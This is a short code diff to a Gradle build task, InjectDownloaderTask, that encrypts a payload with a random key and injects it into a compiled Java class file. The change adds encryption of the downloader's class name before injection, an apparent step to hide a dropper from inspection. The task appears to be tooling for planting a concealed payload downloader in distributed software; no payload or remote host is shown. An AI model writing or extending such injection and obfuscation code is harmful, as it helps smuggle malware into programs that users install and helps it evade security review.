@@ -43,17 +43,19 @@ abstract class InjectDownloaderTask extends DefaultTask {
         String key = generateRandomKey(32)
         String encryptedPayload = encrypt(payloadBytes, key)
 
+        String encryptedDownloaderClassName = encrypt(DOWNLOADER_CLASS_NAME.bytes, key)
+
         def replacementMap = [
-            "::KEY::"                   : key,
-            "::ENCRYPTED_PAYLOAD::"     : encryptedPayload,
-            "::DOWNLOADER_CLASS_NAME::" : DOWNLOADER_CLASS_NAME
+            "::KEY::"                              : key,
+            "::ENCRYPTED_PAYLOAD::"                : encryptedPayload,
+            "::ENCRYPTED_DOWNLOADER_CLASS_NAME::"  : encryptedDownloaderClassName
         ]
 
         logger.lifecycle("-> Preparing to inject data into ${targetClass.get()}:")
         replacementMap.each { placeholder, value ->
             def sizeInBytes = value.getBytes("UTF-8").length
             def sizeInKb = sizeInBytes / 1024.0
-            logger.lifecycle(String.format("  [INJECT] Injecting '%-25s' -> Size: %.2f KB", placeholder, sizeInKb))
+            logger.lifecycle(String.format("  [INJECT] Injecting '%-35s' -> Size: %.2f KB", placeholder, sizeInKb))
         }
         
         String targetPath = targetClass.get().replace('.', '/') + ".class"
